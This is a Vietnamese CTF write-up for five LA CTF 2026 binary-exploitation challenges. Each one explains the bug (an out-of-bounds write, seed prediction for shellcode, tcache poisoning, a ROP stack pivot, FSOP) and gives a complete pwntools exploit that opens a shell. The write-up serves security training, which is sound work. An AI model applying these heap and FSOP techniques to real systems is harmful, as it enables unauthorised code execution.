# LA CTF 2026
## tic-tac-toe
### Mô tả
Tic-tac-toe is a draw when played perfectly. Can you be more perfect than my perfect bot?
### Tìm hiểu challenge
```shell
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/tic-tac-no$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7af0424894612d9b72f91f4435605cb473c32b48, for GNU/Linux 3.2.0, not stripped
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/tic-tac-no$ checksec chall
[*] '/mnt/d/CTF/events/la/tic-tac-no/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/tic-tac-no$
```
### Phân tích
Có thể thấy đây là một game `tic-tac-toe` cho phép người chơi đấu với bot. `Flag` được in ra khi người chơi thắng game này.

Ta có 1 lỗi `Out-of-bound` ở đây, khi `index` nằm ngoài `[0..8]` thì chương trình sẽ vẫn ghi `board[index]`. Do vậy, ta có thể ghi `1 byte` tùy ý xung quanh mảng `board`.  
```c
int index = (x-1)*3+(y-1);
if(index >= 0 && index < 9 && board[index] != ' '){
    printf("Invalid move.\n");
}else{
    board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
    break;
}
```

Chương trình khởi tạo các biến như sau:
```c
char board[9]; // 0x4068
char player = 'X'; // 0x4051
char computer = 'O'; // 0x4050
```

### Ý tưởng khai thác
Sử dụng lỗi `Out-of-bound` để ghi đè giá trị của `computer` thành `'X'`. Do đó, khi đến lượt của `bot` chơi thì nó sẽ điền `'X'` thay vì điền `'O'`. Vì thế người chơi có thể dễ dàng thắng.

Để ghi đè vào `computer`, ta phải chọn `x` và `y` sao cho `(x-1)*3+(y-1)=0x4050-0x4068-1`. Do vậy mình sẽ chọn `x = -7` và `y = 2`.

### Script khai thác
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

p.sendlineafter(b'Enter row #(1-3): ', b'-7')
p.sendlineafter(b'Enter column #(1-3): ', b'2')

p.sendlineafter(b'Enter row #(1-3): ', b'1')
p.sendlineafter(b'Enter column #(1-3): ', b'1')

p.interactive()
```

### Flag
```
lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
```

## ScrabASM
### Mô tả
Scrabble for ASM!
### Tìm hiểu challenge
```shell
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/ScrabASM$ checksec chall
[*] '/mnt/d/CTF/events/la/ScrabASM/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/ScrabASM$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=b6e97f1b753083141a9f765a5582882de57e4a3d, for GNU/Linux 3.2.0, not stripped
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/ScrabASM$
```
### Phân tích
```c
#define HAND_SIZE 14
#define BOARD_ADDR 0x13370000UL
#define BOARD_SIZE 0x1000
```

Chương trình dùng hàm `rand()` để tạo ra 14 byte random và in ra. Sau đó, copy 14 byte đó vào vùng `RWX` tại `0x13370000`. Và thực thi `shellcode` tại địa chỉ đó.

Tuy nhiên, chương trình cho phép random lại kí tự thứ `i` vô số lần nhưng không cho biết nó random ra kí tự nào.
```c
srand(time(NULL));

unsigned char hand[HAND_SIZE];
for (int i = 0; i < HAND_SIZE; i++)
    hand[i] = rand() & 0xFF;

banner();

puts("    Your starting tiles:");
view_hand(hand);

char line[32];
while (1) {
    puts("    1) Swap a tile");
    puts("    2) Play!");
    printf("    > ");
    if (!fgets(line, sizeof(line), stdin)) break;
    int choice = atoi(line);
    switch (choice) {
        case 1: swap_tile(hand); break;
        case 2: play(hand); return 0;
        default: puts("    Invalid choice!"); break;
    }
}
```
### Ý tưởng khai thác
Vì chương trình khởi tạo bằng `srand(time(NULL))`. Mình sẽ dựa vào `14 bytes` in ra ban đầu để `brute force` seed. Sau đó có thể dễ dành predict và control được `shellcode` được thực thi. 

Shellcode 14 bytes: `read(0, 0x1337000a, 0xff)`
```shell
xor eax, eax          
mov esi, edi
xor edi, edi          
mov dl, 0xff          
syscall            
nop
nop
nop
nop
```
### Script khai thác
```python
#!/usr/bin/env python3
from pwn import *
import re, ctypes, time

context.binary = elf = ELF('./chall', checksec=False)
libc = ctypes.CDLL("./libc.so.6")

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

HAND_SIZE = 14
BOARD_ADDR = 0x13370000
BOARD_SIZE = 0x1000

data = p.recvuntil(b'>').decode()
hand_hex = re.findall(r"\|\s*([0-9a-fA-F]{2})\s*", data)
hand = [int(x, 16) for x in hand_hex[:HAND_SIZE]]
log.info(f"Starting tiles:\n{hand}")

t0 = int(time.time())

seed = None
for i in range(-300, 60):
    libc.srand(t0 + i)
    predicted = [libc.rand() & 0xff for _ in range(HAND_SIZE)]
    if predicted == hand:
        seed = t0 + i
        break

log.info(f"Found Seed: {seed}")
libc.srand(seed)

for _ in range(HAND_SIZE):
    b = libc.rand() & 0xff
    print(f"consume: {b:02x}")

shellcode = asm("""
    xor eax, eax          
    mov esi, edi
    xor edi, edi          
    mov dl, 0xff          
    syscall            
    nop
    nop
    nop
    nop
""", arch='amd64', os='linux')
assert len(shellcode) == HAND_SIZE

def swap_title(index: int):
    p.sendline(b"1")
    p.sendline(str(index).encode())
    return libc.rand() & 0xff

for i in range(HAND_SIZE):
    while (True):
        result = swap_title(i)
        if result == shellcode[i]:
            break

    print(f"Ok swapped index {i}")

p.sendline(b"2")
p.sendline(b'A' * 10 + asm(shellcraft.sh()))

p.interactive()
```
### Flag
```
lactf{gg_y0u_sp3ll3d_sh3llc0d3}
```
## tcademy
### Mô tả
I'm telling you, tcache poisoning doesn't just happen due to double-frees!
### Tìm hiểu challenge
```shell
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/tcademy$ checksec chall
[*] '/mnt/d/CTF/events/la/tcademy/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/tcademy$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.35.so, BuildID[sha1]=bff38d5c8e069764fc29c151ddec24b08408fa2d, for GNU/Linux 3.2.0, not stripped
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/tcademy$

```


### Phân tích
```c
char *notes[2] = {0};
```
Chương trình mô phỏng `app note` với các option như sau:
1. Create and fill a note  
2. Delete a note
3. Read a note
4. Exit

Có thể thấy, ta chỉ có thể tạo tối đa `2 notes` và mỗi note giới hạn kích thước là `0xf8 bytes`.

```c
void create_note() {
    int index = get_note_index();
    unsigned short size;
    if (notes[index] != NULL) {
        puts("Already allocated! Free the note first");
        return;
    }

    printf("Size: ");
    scanf("%hu", &size);
    if (size < 0 || size > 0xf8) {
        puts("Invalid size!!!");
        exit(1);
    }

    notes[index] = malloc(size);
    printf("Data: ");
    read_data_into_note(index, notes[index], size); 
    puts("Note created!");
}
```

Tuy nhiên, ta có 1 bug `Heap overflow` ở đây nếu ta nhập vào `size < 8`, khi đó ta có thể nhập vào 1 lượng lớn data và có thể overwrite vào chunk tiếp theo.
```c
int read_data_into_note(int index, char *note, unsigned short size) {
    // I prevented all off-by-one's by forcing the size to be at least 7 less than what was declared by the user! I am so smart
    unsigned short resized_size = size == 8 ? (unsigned short)(size - 7) : (unsigned short)(size - 8); // Heap overflow
    int bytes = read(0, note, resized_size);
    if (bytes < 0) {
        puts("Read error");
        exit(1);
    }
    if (note[bytes-1] == '\n') note[bytes-1] = '\x00';
}
```

Có thể thấy ngay cả phần khởi tạo hay xóa note đều không reset data. Do đó ta có thể dựa vào đó để leak data.
```c
void delete_note() {
    int index = get_note_index();
    free(notes[index]);
    notes[index] = 0;
    puts("Note deleted!");
}
```
### Ý tưởng khai thác
Đầu tiên mình sẽ tạo các notes sau đó delete để đưa 2 chunk của note đó vào `tcache`. Sau đó gọi khởi tạo lại để có thể leak `heap address`.

Tương tự, mình sẽ tạo 2 notes sau đó delete và khởi tạo lại. Nhưng lần này mình sẽ overwrite chunk size của chunk thứ 2 để khi delete thì chunk đó sẽ đưa vào `unsorted bin`. Do vậy khi khởi tạo lại thì mình có thể leak được `libc address`.

Và cuối cùng, mình sẽ dùng bug tương tự trên để `poison` tới `stdout FILE struct` và `FSOP` để `get shell`.
### Script khai thác
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

def create(idx, size, data):
    p.sendlineafter(b'Choice > ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    sleep(0.5)
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'Choice > ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def read(idx):
    p.sendlineafter(b'Choice > ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

create(0, 0x8, b'A')
create(1, 0x8, b'A')

delete(1)
delete(0)

create(0, 0xb8, b'A')
create(1, 0xb8, b'A')

delete(1)
delete(0)

create(0, 0xc8, b'A')
create(1, 0xc8, b'A')

delete(1)
delete(0)

create(0, 0xd8, b'A')
create(1, 0xd8, b'A')

delete(1)
delete(0)

create(0, 0xe8, b'A')
create(1, 0xe8, b'A')

delete(1)
delete(0)

create(0, 0xf8, b'A')
create(1, 0xf8, b'A')

delete(1)
delete(0)

create(0, 0x48, b'A')
delete(0)

create(0, 0x7, b'A' * 0x20)
read(0)

p.recvuntil(b'A' * 0x20)
leak = u64(p.recv(5).ljust(8, b'\x00')) << 12

log.info(f'Heap leak: {hex(leak)}')

create(1, 0x48, b'A')

delete(0)

Chunk20_2 = p64(0x21) + p64(leak >> 12) + b'A' * 0x10
Chunk100_1 = p64(0x101) + p64((leak + 0xaa0) ^ (leak >> 12)) + b'A' * 0xf0
Chunk100_2 = p64(0x101) + p64(leak >> 12) + b'A' * 0xf0

payload = b'A' * 0x18 + b'A' * 0x6c0 + Chunk20_2 + Chunk100_1 + Chunk100_2 + p64(0x501) * 0x141

create(0, 0x7, payload)

delete(1)

delete(0)
create(0, 0x7, b'A' * 0x18 + 0x8E8 * b'B')

read(0)

p.recvuntil(b'B' * 0x8e8)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
log.info(f'Libc base address: {hex(libc.address)}')

delete(0)

Chunk100_F = p64(0x101) + p64((libc.sym._IO_2_1_stdout_) ^ (leak >> 12)) + b'A' * 0x30

create(0, 0x7, b'A' * 0x18 + b'A' * 0xc0 * 2 + b'A' * 0xd0 * 2 + b'A' * 0xe0 * 2 + b'A' * 0xf0 * 2 + Chunk20_2 + Chunk100_F + Chunk100_2)
delete(0)

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
ret = libc.address + 0x29139
pop_rdi = libc.address + 0x2a3e5

fake_vtable = p64(bin_sh) + p64(ret) + p64(system) + b'\x00' * 0x50 + p64(libc.sym.setcontext + 61)
fake_vtable = fake_vtable.ljust(0xa0, b'\x00')
fake_vtable += p64(leak + 0x9a0) + p64(pop_rdi)
fake_vtable = fake_vtable.ljust(0xe0, b'\x00')
fake_vtable += p64(leak + 0x9a0)

fp = FileStructure()
fp.vtable = libc.sym['_IO_wfile_jumps'] - 0x20
fp._lock = leak + 0x200
fp._wide_data = leak + 0x9a0

create(0, 0xf8, fake_vtable)
create(1, 0xf8, bytes(fp))

p.interactive()
```
### Flag
```
lactf{omg_arb_overflow_is_so_powerful}
```

## adventure
### Mô tả
Thanks for playing my game!
### Tìm hiểu challenge
```shell
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/adventure$ checksec chall
[*] '/mnt/d/CTF/events/la/adventure/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/adventure$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.39.so, BuildID[sha1]=a114d7b79bdda3bf3cb0ce0d41cd01e195787d56, for GNU/Linux 3.2.0, not stripped
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/adventure$
```
### Phân tích
Chương trình mô phỏng một game text-based trên bàn cờ 16×16. Người chơi bắt đầu tại tọa độ (0,0) và có tối đa 300 moves để di chuyển và nhặt vật phẩm.

Các lệnh hỗ trợ:

- `n/s/e/w`: di chuyển 1 ô
- `look`: xem ô hiện tại có gì
- `grab`: nhặt item nếu đang đứng trên item
- `inv`: xem inventory và trạng thái
- `help`, `quit`

Có thể thấy hàm`init_board()` đặt 8 item (Sword…Flag) dựa trên địa chỉ main. Và khi nhặt `Flag`, chương trình gọi `check_flag_password()` để nhập `password`.


Ta có 1 lỗi `stack overflow` ở đây khi `password[]` được khởi tạo với `20 bytes` nhưng cho nhập tới `0x20 bytes`.
```c
char password[0020];
...
if (fgets(password, 0x20, stdin) == NULL) { //overflow
    return;
}
```

Vì `history[]` là mảng dùng để lưu lịch sử các lượt chơi trước đó và nó được lưu global nên ta có thể dùng nó để lưu `ROP chain`.
### Ý tưởng khai thác
Đầu tiên mình sẽ quét `board` bằng cách `snake-scan` để có thể leak được `&main` và tính toán `PIE base`. Sau đó mình sẽ thực hiện chain ROP và lưu vào `history[]` và pivot tới đó để leak `libc address`.

Tương tự, mình sẽ gọi lại `main()` và tiếp tục thực hiện chain ROP lưu vào `history[]` và pivot tới đó để `get shell`.
### Script khai thác
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

item_map = {
    "Sword": 0, "Shield": 1, "Potion": 2, "Key": 3,
    "Scroll": 4, "Amulet": 5, "Crown": 6, "Flag": 7
}

found_bytes = {}
curr_x, curr_y = 0, 0

p.recvuntil(b"> ")

p.sendline(b"look")
output = p.recvuntil(b"> ").decode()
for name, idx in item_map.items():
    if f"glimmering {name}" in output:
        byte_val = (curr_x << 4) | curr_y
        found_bytes[idx] = byte_val
        log.info(f"Found {name} at ({curr_x}, {curr_y}) -> Byte {idx}: {hex(byte_val)}")

for _ in range(16): 
    target_x = 15 if curr_y % 2 == 0 else 0
    
    while curr_x != target_x:
        direction = "e" if target_x > curr_x else "w"
        p.sendline(direction.encode())
        
        if direction == "e": curr_x += 1
        else: curr_x -= 1
            
        output = p.recvuntil(b"> ").decode()
        
        for name, idx in item_map.items():
            if f"You spot a {name}" in output:
                byte_val = (curr_x << 4) | curr_y
                found_bytes[idx] = byte_val
                log.info(f"Found {name} at ({curr_x}, {curr_y}) -> Byte {idx}: {hex(byte_val)}")

    if curr_y < 15:
        p.sendline(b"s")
        curr_y += 1
        output = p.recvuntil(b"> ").decode()
        for name, idx in item_map.items():
            if f"You spot a {name}" in output:
                byte_val = (curr_x << 4) | curr_y
                found_bytes[idx] = byte_val
                log.info(f"Found {name} at ({curr_x}, {curr_y}) -> Byte {idx}: {hex(byte_val)}")
    
    if len(found_bytes) == 8:
        break

while curr_x > 0:
    p.sendline(b"w")
    curr_x -= 1
    p.recvuntil(b"> ")

while curr_y > 0:
    p.sendline(b"n")
    curr_y -= 1
    p.recvuntil(b"> ")

log.success("Back at (0, 0)!")

leaked_addr = 0
for i in range(6):
    if i in found_bytes:
        leaked_addr |= (found_bytes[i] << (8 * i))
    else:
        log.warn(f"Byte {i} not found (likely 0x00 or missed).")

elf.address = leaked_addr - elf.sym['main']

log.success(f"Leaked Main Address: {hex(leaked_addr)}")
log.success(f"PIE Base: {hex(elf.address)}")

leave_ret = elf.address + 0x14b7
ret = elf.address + 0x11e4
pop_rbp = elf.address + 0x1233
fgets_gadget = elf.address + 0x164d
print_inv = elf.address + 0x138b

p.send(p64(pop_rbp)[:-1])
p.send(p64(elf.address + 0x4020 + 0x10 - 1)[:-1])
p.send(p64(fgets_gadget)[:-1])
p.send(p64(pop_rbp)[:-1])
p.send(p64(elf.address + 0x4700)[:-1])
p.send(p64(elf.sym.print_inventory)[:-1])
p.send(p64(elf.sym.check_flag_password)[:-1])

p.sendline(b"grab")

p.sendafter(b'Password: ', b'A' * 0x10 + p64(elf.address + 0x4910) + p64(leave_ret))
p.send(p64(elf.got.puts) + b'A' * 0x7 + p64(elf.address + 0x4910 + 0x18) + p64(leave_ret))

p.recvuntil(b"279/300 ")

leak = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym.puts
libc.address = leak
log.success(f"Libc base address: {hex(libc.address)}")

p.send(b'C' * 0x7 + p64(0xcafebebe) + p64(elf.address + 0x4d00) + p64(elf.sym.main))

ROP = ROP(libc)
pop_rdi = ROP.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
ret = ROP.find_gadget(['ret'])[0]
system = libc.sym.system

p.sendline(p64(0xdeedbeef)[:-2])
p.sendline(p64(0xdeedbeef)[:-2])
p.sendline(p64(pop_rdi)[:-2])
p.sendline(p64(bin_sh)[:-2])
p.sendline(p64(system)[:-2])

p.sendline(b"grab")
p.sendline(b"A" * 0x10 + p64(elf.address + 0x4968) + p64(leave_ret))

p.interactive()
```
### Flag
```
lactf{Th3_835T_345T3r_399_i5_4_fl49}
```

## ourukla
### Mô tả
Welcome to ourUKLA v0.1.7!
### Tìm hiểu challenge
```shell
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/ourukla$ checksec chall
[*] '/mnt/d/CTF/events/la/ourukla/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/ourukla$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=62654f07db085203184f67ee482881af35d6ba11, not stripped
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/la/ourukla$
```
### Phân tích
Chương trình mô phỏng quản lý thông tin của 1 trường đại học. 

Nó có 3 chức năng như sau:
1. Add student
2. Get student info
3. Remote studenet

Ta có struct data như sau:
```c
struct student_info {
    char noeditingmyptrs[0x10];
    char *name;                 // heap ptr
    unsigned long attributes;
    char major[0x40];           // inline buffer
    char aux[0x90];             // inline buffer
};
struct student {
    unsigned long array_id;
    unsigned long uid;
    struct student_info *sinfo; // heap ptr
};
```

Trong `remove_student()`:
- Nếu `sinfo` tồn tại thì `free(sinfo->name)` và `free(sinfo)`.
- Sau đó `free(student)` và set `ourUKLA[i] = NULL`.

Còn khi gọi `add_student()`, ta có thể thấy rằng khi ta khởi tạo 1 `struct student` mới nhưng nó không cấp phát ở `top chunk` thì `sinfo` của nó không bị reset.
```c
char* old_top = *((char**)puts + (0x166580/8)) + 0x10;
struct student *s = ourUKLA[cur_index] = malloc(sizeof(struct student));
if ((void *)old_top == (void *)s) s->sinfo = NULL;
```

### Ý tưởng khai thác
Đầu tiên mình sẽ khởi tạo 1 `struct student`, sau đó xóa đi và tạo lại. Vì lúc này, do có bug đã nêu ở trên nên con trỏ `name` đã được đặt vào vùng chứa `heap address`.

Tương tự, tiếp theo mình sẽ khởi tạo và xóa để fill tcache và đưa nó vào `unsorted bin`. Sau đó mình sẽ khởi tạo lại sao cho `struct student` trỏ vào vùng data mà lúc khởi tạo chứa con trỏ `name` vào địa chỉ chứa `main arena`.

Và cuối cùng, mình sẽ overwrite và `poison` tới `stdout FILE struct` và `FSOP` để `get shell.
```python
for i in range(1, 10):
    addStudent(i, b'y', major = p64(heap_base + 0x1aa0 - 0x30) * 3)
for i in range(9, 0, -1):
    delStudent(i)
for i in range(8):
    addStudent(i)
```
### Script khai thác
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

def addStudent(uid = 0, info_flag = b'n', name = b'A' * 0x100, major = b'B' * 0x40, attributes = 0, aux_flag = b'n', aux = b'C' * 0x90):
    p.sendlineafter(b'Option > ', b'1')

    p.sendlineafter(b'Enter student UID: ', str(uid).encode())
    p.sendlineafter(b'Enter student information now (y/n)? You can do it later: ', info_flag)

    if info_flag == b'y':
        p.sendafter(b'Student name: ', name)
        p.sendafter(b'Student major: ', major)
        p.sendlineafter(b'Student attributes (e.g. undergrad = 1):', str(attributes).encode())
        p.sendlineafter(b'Require space to add aux data (y/n)? ', aux_flag)

        if aux_flag == b'y':
            p.sendafter(b'Aux data: ', aux)

def getInfo(uid = 0):
    p.sendlineafter(b'Option > ', b'2')
    p.sendlineafter(b'Enter student UID: ', str(uid).encode())

def delStudent(uid = 0):
    p.sendlineafter(b'Option > ', b'3')
    p.sendlineafter(b'Enter student UID: ', str(uid).encode())

addStudent(0, b'y')
delStudent(0)
addStudent(0)

getInfo(0)

p.recvuntil(b'Student Name: ')
heap_base = (u64(p.recv(5).ljust(8, b'\x00')) << 12) - 0x1000
log.info(f'Heap base: {hex(heap_base)}')

for i in range(1, 10):
    addStudent(i, b'y', major = p64(heap_base + 0x1aa0 - 0x30) * 3)
for i in range(9, 0, -1):
    delStudent(i)
for i in range(8):
    addStudent(i)

getInfo(7)

p.recvuntil(b'Student Name: ')
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - 0x1e6c20
log.info(f'Libc base: {hex(libc.address)}')

fake_vtable = flat({
    0x68: libc.symbols["system"],
    0xA0: heap_base+0x1aa0,
    0xE0: heap_base+0x1aa0,
}, filler=b'\x00')

fp = FileStructure()
fp.flags = b"aa;cat f"
fp._IO_read_ptr = b"lag.txt\x00"
fp.vtable = libc.sym['_IO_wfile_jumps'] - 0x20
fp._lock = heap_base + 0x5000
fp._wide_data = heap_base + 0x1aa0

addStudent(11)
addStudent(12)
addStudent(13, b'y', name = b'Z' * 8, major = b'NGOCSINH' + p64(0x101) + p64((libc.sym._IO_2_1_stdout_) ^ ((heap_base >> 12) + 1)))
addStudent(14, b'y', name = fake_vtable)
addStudent(15, b'y', name = bytes(fp))

p.interactive()
```
### Flag
```
lactf{w0w_y0u_s0lv3d_m3_heap_heap_hurray}
```